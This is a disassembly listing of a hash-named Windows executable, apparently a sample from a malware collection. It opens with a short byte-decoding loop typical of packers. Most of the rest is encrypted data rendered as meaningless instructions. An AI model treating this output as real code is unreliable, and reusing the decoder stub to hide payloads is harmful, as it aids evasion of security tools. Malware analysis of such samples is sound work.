
0f23184b6ef20e47ea1025b8ce045411423e9d35a8e98dc9219f89c242417b66.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	push   ecx
  411001:	push   ebp
  411002:	mov    ebp,DWORD PTR [esp+0x10]
  411006:	xor    eax,eax
  411008:	test   ebp,ebp
  41100a:	push   esi
  41100b:	mov    DWORD PTR [esp+0x8],eax
  41100f:	mov    esi,0xfffffffd
  411014:	je     0x41107a
  411016:	push   ebx
  411017:	push   edi
  411018:	mov    edi,DWORD PTR [esp+0x18]
  41101c:	mov    DWORD PTR [esp+0x1c],0x1
  411024:	mov    cl,BYTE PTR [esi+ebp*1+0x3]
  411028:	add    esi,0x2
  41102b:	inc    esi
  41102c:	mov    BYTE PTR [esi+edi*1],cl
  41102f:	mov    ecx,DWORD PTR [esp+0x24]
  411033:	movzx  ecx,BYTE PTR [eax+ecx*1]
  411037:	mov    edx,DWORD PTR [esp+0x10]
  41103b:	mov    eax,DWORD PTR [esp+0x1c]
  41103f:	add    edx,eax
  411041:	mov    DWORD PTR [esp+0x10],edx
  411045:	ror    eax,cl
  411047:	mov    eax,DWORD PTR [esp+0x10]
  41104b:	mov    edx,eax
  41104d:	shr    edx,0x3
  411050:	mov    ebx,0x1
  411055:	sub    ebx,edx
  411057:	imul   eax,ebx
  41105a:	mov    DWORD PTR [esp+0x10],eax
  41105e:	shl    ebx,0x3
  411061:	mov    bl,BYTE PTR [esi+edi*1]
  411064:	add    bl,cl
  411066:	mov    ecx,DWORD PTR [esp+0x20]
  41106a:	mov    BYTE PTR [esi+edi*1],bl
  41106d:	sub    esi,0x2
  411070:	cmp    esi,ecx
  411072:	jl     0x411024
  411074:	pop    edi
  411075:	pop    ebx
  411076:	pop    esi
  411077:	pop    ebp
  411078:	pop    ecx
  411079:	ret    
  41107a:	(bad)  
  41107c:	fwait
  41107d:	test   bh,al
  41107f:	push   es
  411080:	shr    DWORD PTR [ecx+0x6f],cl
  411083:	and    esi,0xbc41a804
  411089:	jo     0x41109b
  41108b:	sub    BYTE PTR [eax],al
  41108d:	cmc    
  41108e:	dec    ebx
  41108f:	lods   al,BYTE PTR ds:[esi]
  411090:	mov    BYTE PTR [ecx-0xd8c94d8],al
  411096:	stos   BYTE PTR es:[edi],al
  411097:	adc    al,0x79
  411099:	push   edi
  41109a:	sbb    eax,0x950c39b8
  41109f:	pop    ds
  4110a0:	mov    ebp,0x9ee6773f
  4110a5:	stos   DWORD PTR es:[edi],eax
  4110a6:	test   DWORD PTR [ebx+0x1a1d5cb2],ebp
  4110ac:	call   0x81ae:0x32417c1b
  4110b3:	mov    ebx,0x15f2266f
  4110b8:	lock jecxz 0x411046
  4110bb:	jo     0x41106f
  4110bd:	mov    BYTE PTR [ecx+ebp*1-0x36421055],dh
  4110c4:	dec    ecx
  4110c5:	or     al,0xd2
  4110c7:	lahf   
  4110c8:	dec    ebp
  4110c9:	int3   
  4110ca:	out    0x19,eax
  4110cc:	jmp    0x8eefd784
  4110d1:	sbb    bh,BYTE PTR [eax+0x3bfec9df]
  4110d7:	retf   0x6de4
  4110da:	loopne 0x411138
  4110dc:	inc    esi
  4110dd:	jne    0x411066
  4110df:	jle    0x4110f1
  4110e1:	push   esp
  4110e2:	mov    eax,0x9e667f03
  4110e7:	js     0x41108a
  4110e9:	enter  0xe30d,0x6f
  4110ed:	aam    0x4f
  4110ef:	sbb    ebx,DWORD PTR [edx-0x38]
  4110f2:	fstp   QWORD PTR [esi]
  4110f4:	and    al,0x5d
  4110f6:	xor    ah,BYTE PTR [esi]
  4110f8:	and    eax,0x760bd99d
  4110fd:	and    bl,BYTE PTR [ecx+edx*8]
  411100:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411101:	cli    
  411102:	dec    ecx
  411103:	dec    edx
  411104:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411105:	jb     0x4110fb
  411107:	jmp    0x411139
  411109:	dec    esp
  41110a:	rcr    eax,cl
  41110c:	cmc    
  41110d:	pop    ebx
  41110e:	loop   0x411127
  411110:	mov    es,WORD PTR [edi]
  411112:	popf   
  411113:	bound  esi,QWORD PTR [edi+eax*1]
  411116:	xchg   edx,eax
  411117:	sub    ecx,edi
  411119:	iret   
  41111a:	xchg   esi,eax
  41111b:	sbb    DWORD PTR [edx+0xf],edi
  41111e:	sub    al,0xb
  411120:	icebp  
  411121:	js     0x41119c
  411123:	jmp    0x411136
  411125:	rol    BYTE PTR [ebp+0x43c38f57],0xc
  41112c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41112d:	out    0x71,al
  41112f:	pop    esi
  411130:	or     eax,0x49c57bbd
  411135:	push   edi
  411136:	sbb    bh,BYTE PTR [edi+edx*2]
  411139:	add    eax,esp
  41113b:	rcr    BYTE PTR [ebp-0xe],cl
  41113e:	dec    edi
  41113f:	inc    esi
  411140:	sbb    dh,bh
  411142:	xchg   edi,eax
  411143:	lea    ecx,[edx]
  411145:	dec    edi
  411146:	mov    dl,0x12
  411148:	clc    
  411149:	mov    al,ds:0x174752d0
  41114e:	push   eax
  41114f:	fadd   st,st(2)
  411151:	dec    eax
  411152:	sbb    dl,BYTE PTR [ebp-0x42135b18]
  411158:	push   esi
  411159:	add    eax,DWORD PTR [ecx+0x66]
  41115c:	push   0xffffff88
  41115e:	cmp    al,0x95
  411160:	sti    
  411161:	sbb    al,0xb3
  411163:	ins    BYTE PTR es:[edi],dx
  411164:	and    edi,edi
  411166:	lods   al,BYTE PTR ds:[esi]
  411167:	and    ch,BYTE PTR gs:[ebp-0x47dad400]
  41116e:	mov    ds:0x437e70c3,eax
  411173:	sub    eax,0xdfc3b6f0
  411178:	pushf  
  411179:	test   BYTE PTR [eax+0x2a],cl
  41117c:	inc    edx
  41117d:	mov    ebx,0xc6aaa2f6
  411182:	fstp   QWORD PTR [edx+ebp*1+0x6c3e6394]
  411189:	sbb    ch,BYTE PTR [esi+0xb]
  41118c:	outs   dx,BYTE PTR ds:[esi]
  41118d:	popf   
  41118e:	push   es
  41118f:	popf   
  411190:	je     0x411184
  411192:	add    edx,DWORD PTR [esi]
  411194:	pop    ss
  411195:	mov    bh,0x11
  411197:	pop    ds
  411198:	jns    0x411165
  41119a:	dec    esi
  41119b:	jge    0x411196
  41119d:	mov    edi,0xb46a63cf
  4111a2:	jle    0x411177
  4111a4:	pop    es
  4111a5:	inc    ebp
  4111a6:	and    al,0x8b
  4111a8:	idiv   edi
  4111aa:	out    0xf4,al
  4111ac:	push   es
  4111ad:	ret    
  4111ae:	cmp    BYTE PTR [ecx+0x4be62b86],ch
  4111b4:	xchg   esi,eax
  4111b5:	push   edi
  4111b6:	in     eax,dx
  4111b7:	pop    ebp
  4111b8:	mov    ds:0xc29755c9,eax
  4111bd:	jmp    0x6e27:0x8858a07e
  4111c4:	xchg   ecx,eax
  4111c5:	ja     0x41122d
  4111c7:	inc    eax
  4111c8:	inc    esi
  4111c9:	ret    
  4111ca:	or     eax,0xb7440c60
  4111cf:	out    0xda,al
  4111d1:	pusha  
  4111d2:	jp     0x4111dc
  4111d4:	mov    al,0x2
  4111d6:	dec    esp
  4111d7:	into   
  4111d8:	bnd jnp 0x411170
  4111db:	mul    DWORD PTR [esp+edi*2-0x7017298d]
  4111e2:	jo     0x4111fb
  4111e4:	sbb    al,0xb
  4111e6:	test   al,0x52
  4111e8:	mov    esi,0xb41f14d4
  4111ed:	sub    BYTE PTR [edx+0x3c],ch
  4111f0:	imul   ecx,DWORD PTR [ebx+0x27c81550],0xbc686486
  4111fa:	(bad)  
  4111fb:	sub    al,0x91
  4111fd:	inc    ecx
  4111fe:	mov    bl,0x6
  411200:	cs dec esi
  411202:	jecxz  0x4111c1
  411204:	jmp    0x411241
  411206:	mov    ds:0x81474388,al
  41120b:	pop    ebx
  41120c:	jg     0x411204
  41120e:	jge    0x4111d5
  411210:	dec    ecx
  411211:	int3   
  411212:	hlt    
  411213:	imul   BYTE PTR [edi]
  411215:	sub    al,BYTE PTR [edx+0x502a894a]
  41121b:	ins    DWORD PTR es:[edi],dx
  41121c:	lea    ebx,[esi+ecx*4-0x410700bb]
  411223:	out    dx,eax
  411224:	and    esp,ebp
  411226:	push   ebp
  411227:	xchg   edi,eax
  411228:	push   0xffffffea
  41122a:	xor    al,0x2a
  41122c:	inc    eax
  41122d:	sub    ch,cl
  41122f:	arpl   WORD PTR [esi+0x27],sp
  411232:	mov    ebx,0x3721c371
  411237:	mov    bh,0x1
  411239:	adc    ch,BYTE PTR ds:0x5ac30e
  41123f:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  411241:	shl    BYTE PTR cs:[edi-0x291ae9e],cl
  411248:	out    0xaf,al
  41124a:	sbb    DWORD PTR [ecx],0xffffff8e
  41124d:	or     DWORD PTR [edx-0x3af8f27e],0xf8f08fc6
  411257:	call   0x3660:0xb92cd2ea
  41125e:	jae    0x411271
  411260:	xchg   edi,eax
  411261:	imul   ebx,DWORD PTR [edx+edx*8],0x14
  411265:	add    DWORD PTR [edi-0x31],edi
  411268:	scas   al,BYTE PTR es:[edi]
  411269:	xor    BYTE PTR [esi],ah
  41126b:	stos   BYTE PTR es:[edi],al
  41126c:	pop    edx
  41126d:	scas   al,BYTE PTR es:[edi]
  41126e:	stos   DWORD PTR es:[edi],eax
  41126f:	in     al,0x89
  411271:	xchg   BYTE PTR [ebp+0xd],ah
  411274:	test   DWORD PTR [ebx-0x31],ecx
  411277:	jne    0x411291
  411279:	std    
  41127a:	outs   dx,DWORD PTR ds:[esi]
  41127b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41127c:	xchg   ecx,eax
  41127d:	fidivr WORD PTR [esi+0x6ce0493]
  411283:	repnz mov edi,0xea6ba620
  411289:	popa   
  41128a:	ret    
  41128b:	fbld   TBYTE PTR [eax+0x1ccb590f]
  411291:	mov    WORD PTR [ebx],?
  411293:	mov    WORD PTR [edx],?
  411295:	pop    esp
  411296:	mov    WORD PTR [edi+0x6b],es
  411299:	lods   al,BYTE PTR ds:[esi]
  41129a:	inc    ebx
  41129b:	out    dx,eax
  41129c:	imul   edi,DWORD PTR ds:0xc5e1cb8f,0x3ffc7e2
  4112a6:	or     eax,0x74674424
  4112ab:	clc    
  4112ac:	stos   BYTE PTR es:[edi],al
  4112ad:	push   0x675f3293
  4112b2:	dec    ebp
  4112b3:	dec    esi
  4112b4:	or     edx,DWORD PTR [edx+0x200c9a4a]
  4112ba:	dec    ebx
  4112bb:	pop    eax
  4112bc:	push   edx
  4112bd:	sbb    al,0x82
  4112bf:	aad    0x42
  4112c1:	in     al,0x95
  4112c3:	add    BYTE PTR [edi+eiz*1-0x3280b42c],cl
  4112ca:	mov    bl,0x2
  4112cc:	mov    ebp,0xb018ffb2
  4112d1:	lods   eax,DWORD PTR ds:[esi]
  4112d2:	xchg   ebp,eax
  4112d3:	or     DWORD PTR [edx],0xd89f3050
  4112d9:	cmp    bh,dl
  4112db:	jle    0x411336
  4112dd:	retf   0xeb51
  4112e0:	and    al,BYTE PTR [ebx-0x6ca68ddb]
  4112e6:	and    DWORD PTR [edx],ecx
  4112e8:	mov    dh,0xb7
  4112ea:	adc    cl,cl
  4112ec:	cmp    DWORD PTR [ebp-0x1c09edb1],ebx
  4112f2:	fsubr  st,st(3)
  4112f4:	daa    
  4112f5:	pop    ebp
  4112f6:	pop    ss
  4112f7:	enter  0x852b,0xba
  4112fb:	data16 mov dh,cl
  4112fe:	scas   eax,DWORD PTR es:[edi]
  4112ff:	push   eax
  411300:	outs   dx,BYTE PTR ds:[esi]
  411301:	in     eax,0xe0
  411303:	cmc    
  411304:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411305:	inc    edx
  411306:	rol    al,1
  411308:	in     al,0xe8
  41130a:	inc    edx
  41130b:	scas   eax,DWORD PTR es:[edi]
  41130c:	dec    ebp
  41130d:	mov    dh,0x51
  41130f:	or     BYTE PTR [edi],0x10
  411312:	sahf   
  411313:	push   cs
  411314:	in     eax,dx
  411315:	sbb    eax,0x2035577a
  41131a:	sbb    DWORD PTR [ecx-0x7080f90],ebp
  411320:	jb     0xa6531377
  411326:	bound  ebx,QWORD PTR [eax]
  411328:	imul   ecx,DWORD PTR [edx-0x7b],0x6a9f4790
  41132f:	mov    ds:0x557d655d,eax
  411334:	sbb    eax,0xfcdf7024
  411339:	pop    ebx
  41133a:	in     eax,0x13
  41133c:	mov    DWORD PTR [ecx-0x55],edi
  41133f:	lods   al,BYTE PTR ds:[esi]
  411340:	jle    0x411353
  411342:	push   es
  411343:	xlat   BYTE PTR ds:[ebx]
  411344:	jae    0x4113a9
  411346:	hlt    
  411347:	or     BYTE PTR [edx-0x8965525],0xa1
  41134e:	vpackssdw ymm6,ymm2,ymm7
  411352:	pop    ds
  411353:	in     al,0xeb
  411355:	add    dl,BYTE PTR [eax]
  411357:	mov    ebp,0xdd552306
  41135c:	iret   
  41135d:	push   ecx
  41135e:	mov    ecx,0x6e913bc6
  411363:	cmc    
  411364:	xchg   ebx,eax
  411365:	mov    bh,0x7e
  411367:	inc    ebx
  411368:	pop    eax
  411369:	es loope 0x411333
  41136c:	sbb    eax,0x3c2df096
  411371:	or     DWORD PTR [ebp+0x60],ebx
  411374:	xor    al,0xa3
  411376:	ja     0x4113b2
  411378:	xor    bh,BYTE PTR [edi]
  41137a:	jns    0x41131c
  41137c:	mov    ds:0xea4ae283,eax
  411381:	inc    edi
  411382:	xor    al,0x97
  411384:	in     al,dx
  411385:	mov    ecx,0x58a9b1b8
  41138a:	rcr    BYTE PTR [eax+0x3e6d71b2],cl
  411390:	ja     0x411379
  411392:	cmp    al,0x23
  411394:	div    DWORD PTR [ebx-0x29]
  411397:	sub    bl,BYTE PTR [ecx-0x51]
  41139a:	mov    cl,0x15
  41139c:	fwait
  41139d:	repz jbe 0x411363
  4113a0:	cld    
  4113a1:	xchg   BYTE PTR [edx+0x74],bl
  4113a4:	cs push cs
  4113a6:	enter  0x6ab6,0xeb
  4113aa:	fiadd  DWORD PTR [ecx+ebx*4+0x3b11db08]
  4113b1:	sub    al,0xf8
  4113b3:	adc    DWORD PTR [ebx+ecx*8],eax
  4113b6:	or     ch,ah
  4113b8:	sbb    bl,BYTE PTR [eax+eax*1]
  4113bb:	sbb    eax,DWORD PTR [eax+0x3]
  4113be:	fstp   QWORD PTR [edi]
  4113c0:	mov    es,WORD PTR [esi]
  4113c2:	xchg   ebp,eax
  4113c3:	or     dl,bh
  4113c5:	mul    esi
  4113c7:	xchg   esp,eax
  4113c8:	jae    0x4113dd
  4113ca:	in     eax,0x23
  4113cc:	adc    DWORD PTR [edi],ebx
  4113ce:	mov    dh,0xdf
  4113d0:	(bad)  
  4113d1:	jbe    0x4113ed
  4113d3:	xor    BYTE PTR [ebx],ah
  4113d5:	mov    bl,0xc8
  4113d7:	mov    eax,0xa606676c
  4113dc:	xchg   ebp,eax
  4113dd:	in     eax,0xf0
  4113df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4113e0:	scas   ax,WORD PTR es:[edi]
  4113e2:	cs clc 
  4113e4:	out    dx,eax
  4113e5:	loope  0x41140d
  4113e7:	jl     0x4113da
  4113e9:	(bad)  
  4113ea:	loopne 0x41145d
  4113ec:	sbb    DWORD PTR ds:0x4d051495,ecx
  4113f2:	mov    ds:0x29ed81b1,eax
  4113f7:	adc    DWORD PTR [ebx-0x204fb903],edi
  4113fd:	adc    al,0xc
  4113ff:	sub    al,0x7a
  411401:	mov    esp,0x26c40d89
  411406:	iret   
  411407:	mov    DWORD PTR [esi+ecx*4-0x50],esp
  41140b:	idiv   BYTE PTR [edi]
  41140d:	jmp    0x2386:0xa257e1a2
  411414:	and    edi,eax
  411416:	mov    bh,0xb6
  411418:	adc    al,BYTE PTR ds:0x8d779b2a
  41141e:	and    eax,0xaad8f58d
  411423:	pop    eax
  411424:	or     ecx,DWORD PTR [ecx+0x5f]
  411427:	ud0    ebx,DWORD PTR [edi+0x62]
  41142b:	aam    0xaa
  41142d:	lods   eax,DWORD PTR ds:[esi]
  41142e:	push   esi
  41142f:	sbb    DWORD PTR [edx+ebx*2-0x3b6c0031],edi
  411436:	test   al,0xa9
  411438:	cwde   
  411439:	sbb    DWORD PTR [ecx-0x67cf9b45],0x22
  411440:	je     0x411478
  411442:	test   eax,0x1238c440
  411447:	sub    BYTE PTR [edx+0x4e],ch
  41144a:	push   cs
  41144b:	jo     0x4114bb
  41144d:	mov    eax,0x3782175d
  411452:	and    ah,BYTE PTR [eax-0x20ddc81]
  411458:	pusha  
  411459:	inc    ebx
  41145a:	les    esp,FWORD PTR [ebx+0x4b155a0f]
  411460:	pop    ecx
  411461:	pushf  
  411462:	add    edi,esp
  411464:	jp     0x411463
  411466:	and    DWORD PTR [edx],ebx
  411468:	push   ebp
  411469:	int3   
  41146a:	gs sbb ecx,ebx
  41146d:	mov    cs,WORD PTR [eax-0x7f5f2cd8]
  411473:	inc    ebx
  411474:	repz dec ebp
  411476:	adc    dh,BYTE PTR [esi-0x6f]
  411479:	adc    BYTE PTR [edi-0xc],0xc4
  41147d:	adc    eax,ecx
  41147f:	cs add eax,0xede88f2b
  411485:	and    bh,dl
  411487:	(bad)  
  411488:	cmp    al,0x21
  41148a:	fwait
  41148b:	int    0x5e
  41148d:	jle    0x41148b
  41148f:	shl    DWORD PTR [eax],1
  411491:	mov    edx,0x7d11ee1c
  411496:	sub    DWORD PTR [edi+0x3d],ebx
  411499:	dec    edi
  41149a:	jmp    0xf89e0865
  41149f:	stos   DWORD PTR es:[edi],eax
  4114a0:	adc    edx,DWORD PTR [edi]
  4114a2:	inc    esp
  4114a3:	cdq    
  4114a4:	inc    ebp
  4114a5:	int3   
  4114a6:	arpl   WORD PTR [edx-0x2d],sp
  4114a9:	outs   dx,DWORD PTR ds:[esi]
  4114aa:	daa    
  4114ab:	add    eax,0x7b4a4c66
  4114b0:	xlat   BYTE PTR ds:[bx]
  4114b2:	bound  ebp,QWORD PTR [esi]
  4114b4:	add    BYTE PTR [ecx-0x668c708e],dl
  4114ba:	out    dx,al
  4114bb:	es pop ecx
  4114bd:	mov    bl,0xa1
  4114bf:	sahf   
  4114c0:	in     eax,0xfe
  4114c2:	add    BYTE PTR [eax],cl
  4114c4:	out    0xd7,al
  4114c6:	jns    0x4114ce
  4114c8:	cli    
  4114c9:	ficomp DWORD PTR [edx]
  4114cb:	scas   eax,DWORD PTR es:[edi]
  4114cc:	or     al,0xc2
  4114ce:	push   ebx
  4114cf:	add    DWORD PTR [edi-0x22ec783f],eax
  4114d5:	xchg   esp,eax
  4114d6:	aad    0x39
  4114d8:	mov    ds:0x5e1ed4f2,al
  4114dd:	or     DWORD PTR [esi+0x26],0x4e
  4114e1:	iret   
  4114e2:	xchg   ebp,eax
  4114e3:	push   ecx
  4114e4:	mov    esp,0x2c5efb18
  4114e9:	add    eax,0x29ca30fd
  4114ee:	out    0x7d,eax
  4114f0:	in     al,0xc7
  4114f2:	dec    esp
  4114f3:	mov    edi,0x5d76214e
  4114f8:	les    eax,FWORD PTR [ecx-0x15afce8a]
  4114fe:	sub    ch,BYTE PTR [edi]
  411500:	mov    ch,0xd8
  411502:	xlat   BYTE PTR ds:[ebx]
  411503:	ffreep st(2)
  411505:	add    eax,0x6d781bd9
  41150a:	adc    edi,eax
  41150c:	fs shr esi,cl
  41150f:	mov    edx,0xecae5147
  411514:	push   0xc3744946
  411519:	jl     0x41149e
  41151b:	mov    WORD PTR [esi-0x993441a],es
  411521:	pop    es
  411522:	push   0xfffffff4
  411524:	dec    ecx
  411525:	adc    dh,cl
  411527:	test   al,0xc9
  411529:	cmp    al,0xe5
  41152b:	div    BYTE PTR [ebx+0x23]
  41152e:	pop    esi
  411530:	scas   eax,DWORD PTR es:[edi]
  411531:	add    al,0xdb
  411533:	xchg   edi,eax
  411534:	add    dh,BYTE PTR [esi+0xf]
  411537:	and    eax,0x5af3ebdd
  41153c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41153d:	rol    DWORD PTR [ebx-0x76],cl
  411540:	repnz add al,0xe0
  411543:	ficomp DWORD PTR [esi+0x7a1ecbb3]
  411549:	xchg   edx,eax
  41154a:	mov    ds:0xe0ec6dc9,eax
  41154f:	mov    ecx,0x504461ab
  411554:	or     DWORD PTR [edi+edi*1-0x55225280],esi
  41155b:	xor    eax,DWORD PTR [ebp+0x53b7d55b]
  411561:	loopne 0x411536
  411563:	mov    dh,0xc2
  411565:	pop    ss
  411566:	mov    ebx,0x857acf2e
  41156b:	jb     0x41151c
  41156d:	imul   ecx,DWORD PTR [eax+0x7c],0xea5a4935
  411574:	jmp    0x411550
  411576:	outs   dx,DWORD PTR ds:[esi]
  411577:	jno    0x4115f8
  411579:	mov    esi,edi
  41157b:	mov    ds:0xe933e1f4,eax
  411580:	mov    al,ds:0xf1e068b2
  411585:	jbe    0x41156d
  411587:	aam    0x14
  411589:	popf   
  41158a:	sub    al,bl
  41158c:	add    al,0x5a
  41158e:	and    BYTE PTR [ebx+eiz*1+0x4bb5708c],0x5b
  411596:	sbb    BYTE PTR [ecx+0x2d],0x47
  41159a:	sbb    DWORD PTR [edi+0x208b6607],ebp
  4115a0:	adc    ebp,DWORD PTR [eax-0x2504d61]
  4115a6:	add    al,0xf1
  4115a8:	aaa    
  4115a9:	mov    eax,ds:0x37c4063b
  4115ae:	les    edx,FWORD PTR [esi-0x30f63f16]
  4115b4:	cmp    al,0x61
  4115b6:	shl    DWORD PTR [ebx+0xf],0x67
  4115ba:	test   DWORD PTR [ebx+0x2a],esp
  4115bd:	xchg   DWORD PTR [ebp-0x6],ebp
  4115c0:	or     bh,BYTE PTR [bp+si-0x7b80]
  4115c5:	(bad)  
  4115c6:	lods   al,BYTE PTR ds:[esi]
  4115c7:	jne    0x411595
  4115c9:	mov    edi,0xecef8ddf
  4115ce:	je     0x41161d
  4115d0:	retf   0xb547
  4115d3:	rcl    DWORD PTR [ebx-0x621d8547],1
  4115d9:	dec    ecx
  4115da:	inc    ebp
  4115db:	je     0x411569
  4115dd:	mov    ecx,0x4cb461ff
  4115e2:	dec    eax
  4115e3:	sbb    ebp,DWORD PTR [esi]
  4115e5:	xor    eax,ebp
  4115e7:	popa   
  4115e8:	test   eax,0xb63daf8b
  4115ed:	push   0x1f168569
  4115f2:	sub    DWORD PTR [edi],esi
  4115f4:	jae    0x4115b8
  4115f6:	xor    BYTE PTR [eax],ah
  4115f8:	out    dx,eax
  4115f9:	add    eax,0x649134f2
  4115fe:	jge    0x41158c
  411600:	adc    al,0x45
  411602:	(bad)  
  411603:	push   esp
  411604:	sbb    eax,edi
  411606:	jp     0x41160a
  411608:	mov    ebx,0xcf9f9734
  41160d:	add    eax,0x76b37d8
  411612:	outs   dx,DWORD PTR cs:[esi]
  411614:	fidiv  DWORD PTR ds:0x8dfdaaa6
  41161a:	mov    esi,0x8a5b4012
  41161f:	out    0x71,al
  411621:	jnp    0x411625
  411623:	jge    0x41167a
  411625:	inc    esi
  411626:	or     ch,bh
  411628:	leave  
  411629:	push   ss
  41162a:	mov    eax,0x11cd8a82
  41162f:	out    dx,eax
  411630:	inc    esp
  411631:	ins    BYTE PTR es:[edi],dx
  411632:	ins    DWORD PTR es:[edi],dx
  411633:	xchg   ebp,eax
  411634:	popf   
  411635:	bound  edi,QWORD PTR [ebx]
  411637:	push   ss
  411638:	cmp    eax,DWORD PTR [edi-0x2e]
  41163b:	adc    BYTE PTR [ebx-0x2],0xb1
  41163f:	in     eax,dx
  411640:	(bad)  
  411641:	or     DWORD PTR [esi+0x587faaf0],edx
  411647:	icebp  
  411648:	inc    esp
  411649:	sub    al,0x64
  41164b:	icebp  
  41164c:	pop    edx
  41164d:	pop    ss
  41164e:	sti    
  41164f:	int    0xb9
  411651:	fcmovnbe st,st(5)
  411653:	(bad)  
  411654:	mov    eax,0xba545483
  411659:	inc    ebx
  41165a:	mov    ah,0xd4
  41165c:	paddd  mm7,mm6
  41165f:	add    eax,0x301d6b00
  411664:	test   eax,0xbe4b40e8
  411669:	in     eax,dx
  41166a:	int    0x86
  41166c:	push   ds
  41166d:	sub    ch,BYTE PTR [eax-0x18933b55]
  411673:	fnstenv [ebx+0x719623f3]
  411679:	ins    DWORD PTR es:[edi],dx
  41167a:	dec    esi
  41167b:	push   es
  41167c:	mov    ch,0x1e
  41167f:	sbb    BYTE PTR [ecx-0x52],0xf5
  411683:	dec    esp
  411684:	test   ebx,ecx
  411686:	pop    es
  411687:	pop    es
  411688:	dec    edi
  411689:	retf   0xed5d
  41168c:	stos   BYTE PTR es:[edi],al
  41168d:	les    esi,FWORD PTR [ecx]
  41168f:	repnz mov al,ds:0xe9272f39
  411695:	in     al,0xef
  411697:	push   ecx
  411698:	inc    edx
  411699:	jns    0x41164d
  41169b:	cmp    bl,BYTE PTR [ebx-0x38f0f3ea]
  4116a1:	xor    eax,0xf318abb8
  4116a6:	cwde   
  4116a7:	out    dx,eax
  4116a8:	(bad)  
  4116a9:	sbb    ch,dl
  4116ab:	inc    ebx
  4116ac:	ins    DWORD PTR es:[edi],dx
  4116ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116ae:	push   ebx
  4116af:	test   eax,0xf2882d1b
  4116b4:	cmp    eax,0x5500898c
  4116b9:	in     eax,dx
  4116ba:	adc    DWORD PTR [ecx],0x4f
  4116bd:	lds    esi,FWORD PTR [ecx+esi*1]
  4116c0:	or     DWORD PTR [esi-0x35],ecx
  4116c3:	out    dx,al
  4116c4:	repnz cli 
  4116c6:	xor    eax,0x9b8db695
  4116cb:	jmp    0x411743
  4116cd:	lock dec ecx
  4116cf:	adc    al,0xe5
  4116d1:	push   cs
  4116d2:	test   DWORD PTR [ecx],esp
  4116d4:	fiadd  WORD PTR [ebx+0x5e]
  4116d7:	push   0xfcc2ceb3
  4116dc:	gs inc esi
  4116de:	adc    al,0xee
  4116e0:	pop    ds
  4116e1:	mov    eax,ds:0x9364403c
  4116e6:	mov    eax,ds:0x2497c1cf
  4116eb:	cli    
  4116ec:	xor    BYTE PTR [esi-0x5],dh
  4116ef:	neg    DWORD PTR [edi-0x57]
  4116f2:	fs inc ebx
  4116f4:	cwde   
  4116f5:	es (bad) 
  4116f7:	cmc    
  4116f8:	xchg   ecx,eax
  4116f9:	mov    esi,DWORD PTR [ebp-0x5e]
  4116fc:	loopne 0x41168a
  4116fe:	pop    edi
  4116ff:	adc    al,bl
  411701:	pop    ebx
  411702:	jae    0x4116f0
  411704:	dec    esi
  411705:	dec    ebp
  411706:	dec    esi
  411707:	arpl   WORD PTR [bx],si
  41170a:	xor    DWORD PTR [ecx],edi
  41170c:	add    ecx,DWORD PTR [edx]
  41170e:	aad    0x36
  411710:	push   0x4364ac7d
  411715:	xchg   edx,eax
  411716:	cmp    edx,ecx
  411718:	repz in eax,dx
  41171a:	add    eax,0xe095efb7
  41171f:	xchg   esp,eax
  411720:	fmul   DWORD PTR [ecx-0x7e675284]
  411726:	add    al,0x3f
  411728:	xlat   BYTE PTR ds:[ebx]
  411729:	in     eax,0xf4
  41172b:	mov    dh,0xb5
  41172d:	jecxz  0x4116ef
  41172f:	mov    eax,0x9a492a8c
  411734:	and    edx,0x12
  411737:	mov    esp,DWORD PTR [esi]
  411739:	fimul  DWORD PTR [ebp+0x4f]
  41173c:	(bad)  
  41173d:	pop    ebx
  41173e:	mov    ch,0xb3
  411740:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411741:	mov    edx,0x37772720
  411746:	call   0x17bf74ac
  41174b:	pop    ebp
  41174c:	fcmove st,st(4)
  41174e:	(bad)  
  41174f:	xchg   edx,eax
  411750:	mov    ah,0xe3
  411752:	mov    ds:0x5a3b8925,al
  411757:	jp     0x411705
  411759:	aas    
  41175a:	cmp    DWORD PTR gs:[ebx-0x25],ebp
  41175e:	add    al,0x4d
  411760:	pushf  
  411761:	aam    0xf
  411763:	or     BYTE PTR [edx],al
  411765:	fwait
  411766:	cmp    BYTE PTR [edi],dl
  411768:	push   edx
  411769:	pop    edi
  41176a:	mov    ah,0x1a
  41176c:	or     BYTE PTR [ebx+ebx*2],bl
  41176f:	loopne 0x4117d1
  411771:	fs jb  0x41173e
  411774:	mov    esp,0x608009ab
  411779:	inc    edi
  41177a:	pop    edx
  41177b:	les    esp,FWORD PTR [edi-0x22]
  41177e:	adc    BYTE PTR [ebp-0x7f],cl
  411781:	dec    ebx
  411782:	xor    al,0x16
  411784:	and    al,0x64
  411786:	xchg   edi,eax
  411787:	pop    esi
  411788:	popa   
  411789:	mov    dl,0xe0
  41178b:	in     eax,dx
  41178c:	pusha  
  41178d:	retf   0x8e57
  411790:	or     al,0x6d
  411792:	mov    dl,0xff
  411794:	imul   esp,DWORD PTR [ecx-0x78a05cd3],0x34e1edf0
  41179e:	repnz pop eax
  4117a0:	cmc    
  4117a1:	sbb    bl,BYTE PTR [edx]
  4117a3:	cmp    dh,dh
  4117a5:	mov    cl,0x1d
  4117a7:	icebp  
  4117a8:	sti    
  4117a9:	(bad)  [ebp-0x21]
  4117ac:	inc    esp
  4117ad:	push   0xffffffe9
  4117af:	push   ecx
  4117b0:	das    
  4117b1:	cwde   
  4117b2:	dec    ebp
  4117b3:	jg     0x411800
  4117b5:	loopne 0x4117ad
  4117b7:	inc    edi
  4117b8:	sub    DWORD PTR [eiz*1-0xba6cdcb],eax
  4117bf:	test   DWORD PTR [ebp-0x1d],edi
  4117c2:	pop    ebx
  4117c3:	adc    DWORD PTR [ecx-0x40929163],ecx
  4117c9:	or     esp,ebx
  4117cb:	inc    esp
  4117cc:	cmc    
  4117cd:	jmp    0x411836
  4117cf:	jbe    0x41180f
  4117d1:	mov    dh,0x56
  4117d3:	push   ss
